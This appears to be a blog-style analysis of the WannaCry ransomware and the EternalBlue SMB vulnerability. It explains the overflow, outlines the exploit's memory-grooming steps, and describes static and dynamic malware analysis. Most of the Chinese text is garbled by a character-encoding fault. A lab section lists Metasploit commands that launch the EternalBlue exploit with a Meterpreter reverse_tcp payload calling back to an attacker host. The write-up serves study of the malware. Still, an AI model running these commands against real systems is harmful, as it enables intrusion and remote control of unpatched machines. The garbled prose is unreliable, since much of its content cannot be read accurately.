2016<br>ç‰ˆæœ¬ï¼Œç”¨æˆ·å¦‚æœå¼€å¯äº†è‡ªåŠ¨æ›´æ–°æˆ–å®‰è£…äº†å¯¹åº”çš„æ›´æ–°è¡¥ä¸ï¼Œå¯ä»¥æŠµå¾¡è¯¥ç—…æ¯’ã€‚Windows10æ˜¯æœ€å®‰å…¨çš„ï¼Œç”±äºå…¶ç³»ç»Ÿæ˜¯é»˜è®¤å¼€å¯è‡ªåŠ¨æ›´æ–°çš„ï¼Œæ‰€ä»¥ä¸ä¼šå—è¯¥ç—…æ¯’å½±å“ã€‚åŒæ—¶ï¼ŒUnixã€Linuxã€Androidç­‰æ“ä½œç³»ç»Ÿï¼Œä¹Ÿä¸ä¼šå—åˆ°æ”»å‡»ã€‚</p><p>ç½‘ç»œç»“æ„ï¼šç›®å‰è¿™ä¸ªç—…æ¯’é€šè¿‡å…±äº«ç«¯å£ä¼ æ’­åŒæ—¶åœ¨å…¬ç½‘åŠå†…ç½‘è¿›è¡Œä¼ æ’­ï¼Œç›´æ¥æš´éœ²åœ¨å…¬ç½‘ä¸Šä¸”æ²¡æœ‰å®‰è£…ç›¸åº”æ“ä½œç³»ç»Ÿè¡¥ä¸çš„è®¡ç®—æœºæœ‰æå¤§é£é™©ä¼šè¢«æ„ŸæŸ“ï¼Œè€Œé€šè¿‡è·¯ç”±æ‹¨å·çš„ä¸ªäººå’Œä¼ä¸šç”¨æˆ·ï¼Œåˆ™ä¸ä¼šå—åˆ°æ¥è‡ªå…¬ç½‘çš„ç›´æ¥æ”»å‡»</p><h1 id="2-æ°¸æ’ä¹‹è“æ¼æ´"><a href="#2-æ°¸æ’ä¹‹è“æ¼æ´" class="headerlink" title="2 æ°¸æ’ä¹‹è“æ¼æ´"></a>2 æ°¸æ’ä¹‹è“æ¼æ´</h1><h2 id="2-1-æ¼æ´æƒ…å†µè¯´æ˜"><a href="#2-1-æ¼æ´æƒ…å†µè¯´æ˜" class="headerlink" title="2.1 æ¼æ´æƒ…å†µè¯´æ˜"></a>2.1 æ¼æ´æƒ…å†µè¯´æ˜</h2><h3 id="2-1-1-æ¼æ´ç®€ä»‹"><a href="#2-1-1-æ¼æ´ç®€ä»‹" class="headerlink" title="2.1.1 æ¼æ´ç®€ä»‹"></a>2.1.1 æ¼æ´ç®€ä»‹</h3><p>æ°¸æ’ä¹‹è“æ¼æ´æ˜¯ä¸€ç§åˆ©ç”¨Windowsç³»ç»Ÿçš„SMBåè®®æ¼æ´æ¥è·å–ç³»ç»Ÿçš„æœ€é«˜æƒé™ï¼Œä»¥æ­¤æ¥æ§åˆ¶è¢«å…¥ä¾µçš„è®¡ç®—æœºçš„ç³»ç»Ÿæ¼æ´</p><p>æ¼æ´ä»£ç ï¼š MS17-010</p><h3 id="2-1-2-æ¼æ´å½±å“"><a href="#2-1-2-æ¼æ´å½±å“" class="headerlink" title="2.1.2 æ¼æ´å½±å“"></a>2.1.2 æ¼æ´å½±å“</h3><p>2017å¹´4æœˆ14æ—¥æ™šï¼Œå½±å­ç»çºªäººé»‘å®¢ç»„ç»‡å°†æ°¸æ’ä¹‹è“æ¼æ´åœ¨äº’è”ç½‘ä¸Šå…¬å¼€åã€‚åœ¨ä¹‹åçš„äº”ä¸ªæœˆä¸­ï¼Œè¯¥æ¼æ´è¢«å¤šæ¬¾æ¶æ„è½¯ä»¶åˆ©ç”¨ã€‚åŒ…æ‹¬WannaCryï¼Œæ— æ–‡ä»¶çš„å‹’ç´¢è½¯ä»¶UIWIXå’ŒSMBè •è™«EternalRocksã€‚</p><p>EternalBlue(åœ¨å¾®è½¯çš„MS17-010ä¸­è¢«ä¿®å¤)æ˜¯åœ¨Windowsçš„SMBæœåŠ¡å¤„ç†SMB<br>v1è¯·æ±‚æ—¶å‘ç”Ÿçš„æ¼æ´ï¼Œè¿™ä¸ªæ¼æ´å¯¼è‡´æ”»å‡»è€…åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šå¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚</p><h2 id="2-2-SMBåè®®"><a href="#2-2-SMBåè®®" class="headerlink" title="2.2 SMBåè®®"></a>2.2 SMBåè®®</h2><h3 id="2-2-1-ç®€ä»‹"><a href="#2-2-1-ç®€ä»‹" class="headerlink" title="2.2.1 ç®€ä»‹"></a>2.2.1 ç®€ä»‹</h3><p>SMBï¼ˆå…¨ç§°æ˜¯Server Message<br>Blockï¼‰æ˜¯ä¸€ä¸ªåè®®æœåŠ¡å™¨ä¿¡æ¯å—ï¼Œå®ƒæ˜¯ä¸€ç§å®¢æˆ·æœº/æœåŠ¡å™¨ã€è¯·æ±‚/å“åº”åè®®ï¼Œé€šè¿‡SMBåè®®å¯ä»¥åœ¨è®¡ç®—æœºé—´å…±äº«æ–‡ä»¶ã€æ‰“å°æœºã€å‘½åç®¡é“ç­‰èµ„æºï¼Œç”µè„‘ä¸Šçš„ç½‘ä¸Šé‚»å±…å°±æ˜¯é SMBå®ç°çš„ï¼›SMBåè®®å·¥ä½œåœ¨åº”ç”¨å±‚å’Œä¼šè¯å±‚ï¼Œå¯ä»¥ç”¨åœ¨TCP/IPåè®®ä¹‹ä¸Šï¼ŒSMBä½¿ç”¨TCP139ç«¯å£å’ŒTCP445ç«¯å£ã€‚</p><h3 id="2-2-2-å·¥ä½œåŸç†"><a href="#2-2-2-å·¥ä½œåŸç†" class="headerlink" title="2.2.2 å·¥ä½œåŸç†"></a>2.2.2 å·¥ä½œåŸç†</h3><p>ï¼ˆ1ï¼‰ï¼šé¦–å…ˆå®¢æˆ·ç«¯å‘é€ä¸€ä¸ªSMB negport<br>è¯·æ±‚æ•°æ®æŠ¥ï¼Œï¼Œå¹¶åˆ—å‡ºå®ƒæ‰€æ”¯æŒçš„æ‰€æœ‰SMBçš„åè®®ç‰ˆæœ¬ã€‚æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚æ¶ˆæ¯åå“åº”è¯·æ±‚ï¼Œå¹¶åˆ—å‡ºå¸Œæœ›ä½¿ç”¨çš„SMBåè®®ç‰ˆæœ¬ã€‚å¦‚æœæ²¡æœ‰å¯ä»¥ä½¿ç”¨çš„åè®®ç‰ˆæœ¬åˆ™è¿”å›0XFFFFHï¼Œç»“æŸé€šä¿¡ã€‚</p><p>ï¼ˆ2ï¼‰ï¼šåè®®ç¡®å®šåï¼Œå®¢æˆ·ç«¯è¿›ç¨‹å‘æœåŠ¡å™¨å‘èµ·ä¸€ä¸ªç”¨æˆ·æˆ–å…±äº«çš„è®¤è¯ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯é€šè¿‡å‘é€SessetupXè¯·æ±‚æ•°æ®åŒ…å®ç°çš„ã€‚å®¢æˆ·ç«¯å‘é€ä¸€å¯¹ç”¨æˆ·åå’Œå¯†ç æˆ–ä¸€ä¸ªç®€å•å¯†ç åˆ°æœåŠ¡å™¨ï¼Œç„¶åé€šè¿‡æœåŠ¡å™¨å‘é€ä¸€ä¸ªSessetupXåº”ç­”æ•°æ®åŒ…æ¥å…è®¸æˆ–æ‹’ç»æœ¬æ¬¡è¿æ¥</p><p>ï¼ˆ3ï¼‰ï¼šå½“å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å®Œæˆäº†ç£‹å•†å’Œè®¤è¯ä¹‹åï¼Œå®ƒä¼šå‘é€ä¸€ä¸ªTconæˆ–TconX<br>SMBæ•°æ®æŠ¥å¹¶åˆ—å‡ºå®ƒæƒ³è®¿é—®çš„ç½‘ç»œèµ„æºçš„åç§°ï¼Œä¹‹åä¼šå‘é€ä¸€ä¸ªTconXåº”ç­”æ•°æ®æŠ¥ä»¥è¡¨ç¤ºæ­¤æ¬¡è¿æ¥æ˜¯å¦æ¥æ”¶æˆ–æ‹’ç»ã€‚</p><p>ï¼ˆ4ï¼‰ï¼šè¿æ¥åˆ°ç›¸åº”èµ„æºåï¼ŒSMBå®¢æˆ·ç«¯å°±èƒ½å¤Ÿé€šè¿‡open<br>SMBæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œé€šè¿‡read SMBè¯»å–æ–‡ä»¶ï¼Œé€šè¿‡write SMBå†™å…¥æ–‡ä»¶ï¼Œé€šè¿‡close<br>SMBå…³é—­æ–‡ä»¶ã€‚</p><h2 id="2-3-æº¢å‡ºåˆ†æ"><a href="#2-3-æº¢å‡ºåˆ†æ" class="headerlink" title="2.3 æº¢å‡ºåˆ†æ"></a>2.3 æº¢å‡ºåˆ†æ</h2><h3 id="2-3-1-æ¦‚è¿°"><a href="#2-3-1-æ¦‚è¿°" class="headerlink" title="2.3.1 æ¦‚è¿°"></a>2.3.1 æ¦‚è¿°</h3><p>æ¼æ´å‡ºç°åœ¨<code>Windows SMB v1</code>ä¸­çš„å†…æ ¸æ€å‡½æ•°<code>srv!SrvOs2FeaListToNt</code>åœ¨å¤„ç†FEA(File Extended Attributes)è½¬æ¢æ—¶ï¼Œåœ¨å¤§éåˆ†é¡µæ± (å†…æ ¸çš„æ•°æ®ç»“æ„ï¼ŒLarge Non-Paged Kernel Pool)ä¸Šå­˜åœ¨ç¼“å†²åŒºæº¢å‡ºã€‚å‡½æ•°<code>srv!SrvOs2FeaListToNt</code>åœ¨å°†FEA listè½¬æ¢æˆ<code>NTFEA</code>(Windows NT FEA) listå‰ä¼šè°ƒç”¨<code>srv!SrvOs2FeaListSizeToNt</code>å»è®¡ç®—è½¬æ¢åçš„<code>FEA lsit</code>çš„å¤§å°ã€‚ç„¶åä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š</p><p>1.srv!SrvOs2FeaListSizeToNtä¼šè®¡ç®—FEA listçš„å¤§å°å¹¶æ›´æ–°å¾…è½¬æ¢çš„FEA listçš„å¤§å°</p><p>2.å› ä¸ºé”™è¯¯çš„ä½¿ç”¨WORDå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œå¯¼è‡´è®¡ç®—å‡ºæ¥çš„å¾…è½¬æ¢çš„FEA listçš„å¤§å°æ¯”çœŸæ­£çš„FEA listå¤§</p><p>3.å› ä¸ºåŸå…ˆçš„æ€»å¤§å°è®¡ç®—é”™è¯¯ï¼Œå¯¼è‡´å½“FEA listè¢«è½¬åŒ–ä¸ºNTFEA listæ—¶ï¼Œä¼šåœ¨éåˆ†é¡µæ± å¯¼è‡´ç¼“å†²åŒºæº¢å‡º</p><h2 id="2-4-æ¼æ´çš„åˆ©ç”¨"><a href="#2-4-æ¼æ´çš„åˆ©ç”¨" class="headerlink" title="2.4 æ¼æ´çš„åˆ©ç”¨"></a>2.4 æ¼æ´çš„åˆ©ç”¨</h2><h3 id="2-4-1-æƒ…å†µè¯´æ˜"><a href="#2-4-1-æƒ…å†µè¯´æ˜" class="headerlink" title="2.4.1 æƒ…å†µè¯´æ˜"></a>2.4.1 æƒ…å†µè¯´æ˜</h3><p>æ¼æ´ä»£ç å·¥ä½œåœ¨å†…æ ¸çš„éåˆ†é¡µå†…å­˜ä¸­ã€‚ä¹Ÿå¯ä»¥å·¥ä½œåœ¨å¤§éåˆ†é¡µæ± ä¸­ã€‚è¿™äº›ç±»å‹çš„æ± éƒ½æ²¡æœ‰åœ¨é¡µçš„å¼€å§‹åµŒå…¥ä»»ä½•å¤´éƒ¨ã€‚å› æ­¤éœ€è¦ç‰¹æ®Šçš„æŠ€å·§æ¥åˆ©ç”¨è¿™äº›æ¼æ´ã€‚è¿™äº›æŠ€å·§éœ€è¦é€†å‘ä¸€äº›æ•°æ®ç»“æ„</p><h3 id="2-4-2-åˆ©ç”¨è¿‡ç¨‹"><a href="#2-4-2-åˆ©ç”¨è¿‡ç¨‹" class="headerlink" title="2.4.2 åˆ©ç”¨è¿‡ç¨‹"></a>2.4.2 åˆ©ç”¨è¿‡ç¨‹</h3><p>EternalBlueé¦–å…ˆå‘é€ä¸€ä¸ªSRVbufferé™¤äº†æœ€åä¸€ä¸ªæ•°æ®åŒ…ã€‚è¿™æ˜¯å› ä¸ºå¤§éåˆ†é¡µæ± å°†åœ¨ä¼šè¯ä¸­æœ€åä¸€ä¸ªæ•°æ®åŒ…è¢«æœåŠ¡ç«¯æ¥æ”¶çš„æ—¶å€™è¢«å»ºç«‹ã€‚SMBæœåŠ¡å™¨ä¼šæŠŠä¼šè¯ä¸­æ¥å—åˆ°çš„æ•°æ®è¯»å–å¹¶å åŠ èµ·æ¥æ”¾å…¥è¾“å…¥ç¼“å†²åŒºä¸­ã€‚æ‰€æœ‰çš„æ•°æ®ä¼šåœ¨TRANSåŒ…ä¸­è¢«æ ‡æ˜ã€‚å½“æ¥æ”¶åˆ°æ‰€æœ‰çš„æ•°æ® SMBæœåŠ¡å™¨å°†ä¼šå¤„ç†è¿™äº›æ•°æ®ã€‚æ•°æ®é€šè¿‡CIFS(Common Internet File System)ä¼šè¢«åˆ†å‘åˆ°SrvOpen2å‡½æ•°ä¸­æ¥è¯»å–ã€‚</p><p>EternalBlueå‘é€çš„æ‰€æœ‰æ•°æ®ä¼šè¢«SMBæœåŠ¡å™¨æ”¶åˆ°åï¼ŒSMBæœåŠ¡å™¨ä¼šå‘é€SMB ECHOåŒ…ã€‚å› ä¸ºæ”»å‡»å¯ä»¥åœ¨ç½‘é€Ÿå¾ˆæ…¢çš„æƒ…å†µä¸‹å®ç°ï¼Œæ‰€ä»¥SMB ECHOæ˜¯å¾ˆé‡è¦çš„ã€‚</p><p>åœ¨æˆ‘ä»¬çš„åˆ†æä¸­ï¼Œå³ä½¿æˆ‘ä»¬å‘é€äº†åˆå§‹æ•°æ®ï¼Œå­˜åœ¨æ¼æ´çš„ç¼“å†²åŒºä»ç„¶æ²¡æœ‰è¢«åˆ†é…åœ¨å†…å­˜ä¸­ã€‚</p><p>1.FreeHole_A: EternalBlueé€šè¿‡å‘é€SMB v1æ•°æ®åŒ…æ¥å®Œæˆå ä½</p><p>2.SMBv2_1n: å‘é€ä¸€ç»„SMB v2æ•°æ®åŒ…</p><p>3.FreeHole_B: å‘é€å¦ä¸€ä¸ªå ä½æ•°æ®åŒ…ï¼›å¿…é¡»ç¡®ä¿ç¬¬ä¸€ä¸ªå ä½çš„FreeHole_Aè¢«é‡Šæ”¾ä¹‹å‰ï¼Œè¿™å—å†…å­˜è¢«åˆ†é…</p><p>4.FreeHole_A_CLOSE: å…³é—­è¿æ¥ï¼Œä½¿å¾—ç¬¬ä¸€ä¸ªå ä½çš„å†…å­˜ç©ºé—´è¢«é‡Šæ”¾</p><p>5.SMBv2_2n: å‘é€ä¸€ç»„SMB v2æ•°æ®åŒ…</p><p>6.FreeHole_B_CLOSE: å…³é—­è¿æ¥æ¥é‡Šæ”¾ç¼“å†²åŒº</p><p>7.FINAL_Vulnerable_Buffer: å‘é€æœ€åçš„æ•°æ®åŒ…ï¼Œè¿™ä¸ªæ•°æ®åŒ…å°†ä¼šè¢«å­˜å‚¨åœ¨æœ‰æ¼æ´çš„ç¼“å†²åŒºä¸­</p><p>æœ‰æ¼æ´çš„ç¼“å†²åŒºï¼ˆä¹‹å‰SRVNETåˆ›å»ºçš„ï¼‰è¢«å¡«å…¥çš„æ•°æ®å°†ä¼šè¦†ç›–å’Œéƒ¨åˆ†SRVNETçš„ç¼“å†²åŒºã€‚åœ¨FEA<br>listè½¬æ¢åˆ°NTFEA<br>listæ—¶ä¼šå‘ç”Ÿé”™è¯¯ï¼Œå› ä¸ºFEAç»“æ„ä¼šåœ¨è¦†ç›–SRVNETç¼“å†²åŒºä¹‹åå¤±æ•ˆï¼Œæ‰€ä»¥æœåŠ¡å™¨å°†ä»¥STATUS_INVALID_PARAMETERï¼ˆ0xC000000Dï¼‰è¿”å›ã€‚</p><h2 id="2-5-æ¼æ´æ”»å‡»"><a href="#2-5-æ¼æ´æ”»å‡»" class="headerlink" title="2.5 æ¼æ´æ”»å‡»"></a>2.5 æ¼æ´æ”»å‡»</h2><h3 id="2-5-1-å‡†å¤‡å·¥ä½œ"><a href="#2-5-1-å‡†å¤‡å·¥ä½œ" class="headerlink" title="2.5.1 å‡†å¤‡å·¥ä½œ"></a>2.5.1 å‡†å¤‡å·¥ä½œ</h3><p>å‡†å¤‡ä¸¤å°è™šæ‹Ÿæœºï¼Œä¸€å°kali-linux ä¸€å° win7ï¼Œä½¿ç”¨Wireshark<br>è¿›è¡ŒæŠ“åŒ…ï¼Œåˆ©ç”¨msfconsoleå·¥å…·è¿›è¡Œæ¨¡æ‹Ÿæ”»å‡»</p><h3 id="2-5-2-æ”»å‡»è¿‡ç¨‹"><a href="#2-5-2-æ”»å‡»è¿‡ç¨‹" class="headerlink" title="2.5.2 æ”»å‡»è¿‡ç¨‹"></a>2.5.2 æ”»å‡»è¿‡ç¨‹</h3><p>1.è·å–ä¸¤å°ä¸»æœºçš„IPåœ°å€</p><p>2.æµ‹è¯•ä¸¤å°ä¸»æœºçš„è¿é€šæ€§</p><p>3.ä½¿å¾— kali çš„æ•°æ®ä¿æŒå¼€å¯</p><p>æµ‹è¯•æ˜¯å¦å¼€å¯ï¼š service postgresql status</p><p>æ‰“å¼€æ•°æ®åº“ ï¼š service postgresql start</p><p>åˆå§‹åŒ–æ•°æ®åº“ï¼š msfdb init</p><p>4.åˆ©ç”¨ msfconsole è¿›è¡Œæ¼æ´æ‰«æ</p><p>å¯åŠ¨ï¼š msfconsole</p><p>æŸ¥çœ‹æ•°æ®åº“è¿æ¥æƒ…å†µï¼šdb_status</p><p>æœç´¢æ¼æ´ï¼š search ms17_010</p><p>æ‰«æå‘½ä»¤ï¼šuse auxiliary/scanner/smb/smb_ms17_010</p><p>æ”»å‡»å‘½ä»¤ï¼ˆåé¢ä½¿ç”¨ï¼‰ï¼šuse exploit/windows/smb/ms17_010_eternalblue</p><p>è®¾ç½®æ‰«æçš„ä¸»æœºæˆ–è€…ä¸»æœºæ®µï¼šset rhostsÂ 192.168.223.141/24;</p><p>è®¾ç½®æ‰«æçº¿ç¨‹ä¸º20ï¼š set threads 20ï¼›</p><p>æœ€åè¾“å…¥runæ‰§è¡Œæ‰«æã€‚</p><p>åŒæ—¶ï¼Œåˆ©ç”¨ wiresharkæŠ“åŒ…å·¥å…·ï¼Œç›‘å¬ethO</p><p>è¿›è¡Œæ”»å‡»ï¼šuse exploit/windows/smb/ms17_010_eternalblue</p><p>è®¾ç½®æ”»å‡»ç›®æ ‡ï¼ˆé¶æœºï¼‰ï¼šset rhostÂ 192.168.223.141</p><p>è®¾ç½®æ”»å‡»è½½è·ï¼šset payload windows/x64/meterpreter/reverse_tcp</p><p>è®¾ç½®ç›‘å¬ä¸»æœºï¼ˆkaliï¼‰ï¼šset lhost 192.168.223.137</p><p>åˆ©ç”¨exploitè¿›è¡Œæ”»å‡»ï¼šexploit</p><p>æˆåŠŸæ”»å‡»ï¼ï¼</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image1.png" class="" width="1"><p>å›¾1 æ‰“å¼€å¹¶åˆå§‹åŒ–æ•°æ®åº“</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image2.png" class="" width="2"><p>å›¾2 æ‰“å¼€msfconsole å¹¶æŸ¥æ‰¾ms17_010</p><h1 id="4-ç—…æ¯’åˆ†æ"><a href="#4-ç—…æ¯’åˆ†æ" class="headerlink" title="4 ç—…æ¯’åˆ†æ"></a>4 ç—…æ¯’åˆ†æ</h1><h2 id="4-1-åŸºç¡€é™æ€åˆ†æ"><a href="#4-1-åŸºç¡€é™æ€åˆ†æ" class="headerlink" title="4.1 åŸºç¡€é™æ€åˆ†æ"></a>4.1 åŸºç¡€é™æ€åˆ†æ</h2><h3 id="4-1-1-æŸ¥å£³"><a href="#4-1-1-æŸ¥å£³" class="headerlink" title="4.1.1 æŸ¥å£³"></a>4.1.1 æŸ¥å£³</h3><p>ç¬¬ä¸€æ­¥é˜²æ­¢å¼€å‘è€…å¯¹ç—…æ¯’è¿›è¡Œäº†åŒ…è£…ï¼Œå¯¹ç—…æ¯’è¿›è¡ŒæŸ¥å£³æ“ä½œï¼Œä»¥ä¸‹æ˜¯æŸ¥å£³ç»“æœ</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image3.jpeg" class="" width="3"><p>å›¾ä¸€ï¼šExeinfoæŸ¥å£³</p><p>é€šè¿‡ Lamer infoå­—æ®µçš„Not packedï¼Œæˆ‘ä»¬çŸ¥é“ç—…æ¯’æ— å£³ï¼Œçœå»äº†è„±å£³çš„éº»çƒ¦</p><h3 id="4-1-2-å­—ç¬¦ä¸²åˆ†æ"><a href="#4-1-2-å­—ç¬¦ä¸²åˆ†æ" class="headerlink" title="4.1.2 å­—ç¬¦ä¸²åˆ†æ"></a>4.1.2 å­—ç¬¦ä¸²åˆ†æ</h3><p>åˆ©ç”¨IDAå·¥å…·ä¸­æä¾›çš„ Strings Window<br>å·¥å…·ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥æ‰¾ç—…æ¯’æºæ–‡ä»¶ä¸­å«æœ‰çš„æ˜¾å¼çš„å­—ç¬¦ä¸²ï¼Œè¿™ä¸€æ­¥èƒ½å¸®æˆ‘ä»¬å¯¹ç—…æ¯’çš„å¤§è‡´åŠŸèƒ½å’ŒåŠ å¯†æ–¹å¼ç­‰ç”±å¤§è‡´çš„äº†è§£ã€‚</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image4.jpeg" class="" width="4"><p>å›¾äºŒï¼šç—…æ¯’çš„å­—ç¬¦ä¸²ä¿¡æ¯</p><p>é€šè¿‡å­—ç¬¦ä¸²åˆ†æï¼Œæˆ‘ä»¬å¤§è‡´äº†è§£äº†ï¼Œç—…æ¯’å¯èƒ½åˆ©ç”¨äº†RSAå’ŒAES<br>çš„åŠ å¯†æ–¹å¼ï¼ŒåŒæ—¶å’Œ TaskStart å‡½æ•°ï¼Œt.wnry<br>,tasksche.exeç­‰æ–‡ä»¶æœ‰å¾ˆå¤§çš„å…³è”å…³ç³»ï¼Œè¿˜åˆ©ç”¨äº†CMDè°ƒç”¨äº†æŸäº›å‚æ•°ã€‚</p><h3 id="4-1-3-è¯†åˆ«åŠ å¯†ç®—æ³•"><a href="#4-1-3-è¯†åˆ«åŠ å¯†ç®—æ³•" class="headerlink" title="4.1.3 è¯†åˆ«åŠ å¯†ç®—æ³•"></a>4.1.3 è¯†åˆ«åŠ å¯†ç®—æ³•</h3><p>é€šè¿‡ Kyrpto ANAlyzer æ’ä»¶è¯†åˆ«ç—…æ¯’æ–‡ä»¶çš„åŠ å¯†ç®—æ³•</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image5.jpeg" class="" width="5"><p>å›¾å››ï¼š è¯†åˆ«åŠ å¯†ç®—æ³•</p><p>ç»è¿‡åˆ†æå¾—çŸ¥ï¼Œç—…æ¯’ä½¿ç”¨äº† CRC32 å’Œ AES åŠ å¯†ç®—æ³•ï¼ŒCryptDecrypt å’Œ<br>CryptEncrypt æ˜¯å¾®è½¯æä¾›çš„åŠ å¯†ç±»åº“ï¼ŒZIP2å’ŒZLIB æ˜¯å‹ç¼©ç®—æ³•</p><h3 id="4-1-4-æŸ¥çœ‹å¯¼å…¥è¡¨"><a href="#4-1-4-æŸ¥çœ‹å¯¼å…¥è¡¨" class="headerlink" title="4.1.4 æŸ¥çœ‹å¯¼å…¥è¡¨"></a>4.1.4 æŸ¥çœ‹å¯¼å…¥è¡¨</h3><p>é€šè¿‡PEiDæä¾›çš„è¾“å…¥è¡¨æŸ¥çœ‹å™¨ï¼Œå¯¹ç—…æ¯’æºæ–‡ä»¶çš„è¾“å…¥è¡¨è¿›è¡ŒæŸ¥çœ‹ï¼Œæ¢å¯»ç—…æ¯’ã€‚</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image6.jpeg" class="" width="6"><p>å›¾äº”ï¼šæŸ¥çœ‹ç—…æ¯’è¾“å…¥è¡¨</p><p>åœ¨Kernel32ä¸­å‘ç°ç—…æ¯’åˆ©ç”¨äº†LoadResourceï¼ŒLockResourceç­‰å‡½æ•°ï¼Œè¡¨æ˜äº†ç—…æ¯’èµ„æºæ®µä¸­å¯èƒ½è—æœ‰ç—…æ¯’éœ€è¦åˆ©ç”¨çš„å…¶ä»–æ–‡ä»¶</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image7.jpeg" class="" width="7"><p>å›¾å…­ï¼šç—…æ¯’è¾“å…¥è¡¨-æ³¨å†Œè¡¨æ“ä½œ</p><p>ç—…æ¯’åˆ©ç”¨äº†ADVAPI32.dllä¸­çš„RegCreateKeyWï¼ŒRegSetValueExAç­‰å‡½æ•°ï¼Œä»£è¡¨ç—…æ¯’æºç ä¸­æ¶‰åŠäº†å¯¹æ³¨å†Œè¡¨çš„æ“ä½œï¼Œå¯ä»¥åœ¨ç—…æ¯’æ‰§è¡Œå®Œåå¯¹æ³¨å†Œè¡¨è¿›è¡Œæ¯”è¾ƒã€‚</p><h3 id="4-1-5-æå–èµ„æºæ®µ"><a href="#4-1-5-æå–èµ„æºæ®µ" class="headerlink" title="4.1.5 æå–èµ„æºæ®µ"></a>4.1.5 æå–èµ„æºæ®µ</h3><p>é€šè¿‡è¾“å…¥è¡¨çš„åˆ†æï¼Œæˆ‘ä»¬äº†è§£åˆ°ç—…æ¯’exeçš„èµ„æºæ®µä¸­å¯èƒ½éšè—ç€ç—…æ¯’æ‰€æ‹¥æœ‰çš„å…¶ä»–èµ„æºæ–‡ä»¶ï¼Œä¸ºæ­¤ï¼Œæˆ‘ä»¬å¯¹èµ„æºæ–‡ä»¶è¿›è¡Œæå–ã€‚</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image8.jpeg" class="" width="8"><p>å›¾ä¸ƒï¼šèµ„æºæ®µæŸ¥çœ‹</p><p>ä»èµ„æºæ®µåˆ†ææ¥çœ‹ï¼ŒXIAèµ„æºæ®µæœ€å€¼å¾—æˆ‘ä»¬å…³æ³¨ï¼Œåœ¨èµ„æºæ®µä¸­æˆ‘ä»¬å‘ç°èµ„æºæ®µå¤´çš„PKå­—æ®µï¼Œåˆ¤æ–­è¯¥èµ„æºæ®µåº”è¯¥æ˜¯rarçš„å‹ç¼©æ–‡ä»¶ï¼Œæˆ‘ä»¬å°†èµ„æºæ®µæå–å‡ºæ¥</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image9.jpeg" class="" width="9"><p>å›¾å…«ï¼šXIAèµ„æºæ®µ</p><p>å‘ç°äº†éšè—åœ¨ç—…æ¯’èµ„æºæ®µçš„æ–‡ä»¶ å…¶ä¸­msgä¸­æ˜¯ä¸€äº›è¯­è¨€åŒ…</p><h2 id="4-2-åŸºç¡€åŠ¨æ€åˆ†æ"><a href="#4-2-åŸºç¡€åŠ¨æ€åˆ†æ" class="headerlink" title="4.2 åŸºç¡€åŠ¨æ€åˆ†æ"></a>4.2 åŸºç¡€åŠ¨æ€åˆ†æ</h2><h3 id="4-2-1-è¿›ç¨‹åˆ†æ"><a href="#4-2-1-è¿›ç¨‹åˆ†æ" class="headerlink" title="4.2.1 è¿›ç¨‹åˆ†æ"></a>4.2.1 è¿›ç¨‹åˆ†æ</h3><p>ä½¿ç”¨ ProcessMonitor æŸ¥çœ‹è¿›ç¨‹æ ‘</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image10.png" class="" width="10"><p>å›¾ä¹ï¼šè¿›ç¨‹æ ‘</p><p>Wcry.exeæ€»å…±æ‹¥æœ‰5ä¸ªå­è¿›ç¨‹ï¼Œå…¶ä¸­cmdè´Ÿè´£æ‰§è¡Œä¸€äº›æ‰¹å¤„ç†æ–‡ä»¶</p><h3 id="4-2-2-æ³¨å†Œè¡¨åˆ†æ"><a href="#4-2-2-æ³¨å†Œè¡¨åˆ†æ" class="headerlink" title="4.2.2 æ³¨å†Œè¡¨åˆ†æ"></a>4.2.2 æ³¨å†Œè¡¨åˆ†æ</h3><p>ä½¿ç”¨Regshot æ¯”è¾ƒç—…æ¯’æ‰§è¡Œå‰åçš„æ³¨å†Œè¡¨å˜åŒ–</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image11.jpeg" class="" width="11"> <img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image12.jpeg" class="" width="12"><p>å›¾åï¼šregshotç»“æœ</p><p>é€šè¿‡Regshotçš„æ¯”å¯¹ï¼Œæˆ‘ä»¬å‘ç°ç—…æ¯’å¢åŠ äº†ä¸€äº›åŠ è§£å¯†éœ€è¦çš„å¯†é’¥æ³¨å†Œè¡¨é¡¹å’Œè‡ªåŠ¨è¿è¡Œçš„ç—…æ¯’è·¯å¾„ä½ç½®</p><h3 id="4-2-3-æ–‡ä»¶ç›‘æ§"><a href="#4-2-3-æ–‡ä»¶ç›‘æ§" class="headerlink" title="4.2.3 æ–‡ä»¶ç›‘æ§"></a>4.2.3 æ–‡ä»¶ç›‘æ§</h3><p>ä¸‹é¢æˆ‘ä»¬åˆ©ç”¨ç«ç»’å‰‘æŠ“å–ç—…æ¯’è¿è¡Œè¿‡ç¨‹ä¸­ç—…æ¯’æ–‡ä»¶å¯¹äºæ–‡ä»¶çš„æ›´æ”¹ï¼Œ</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image13.jpeg" class="" 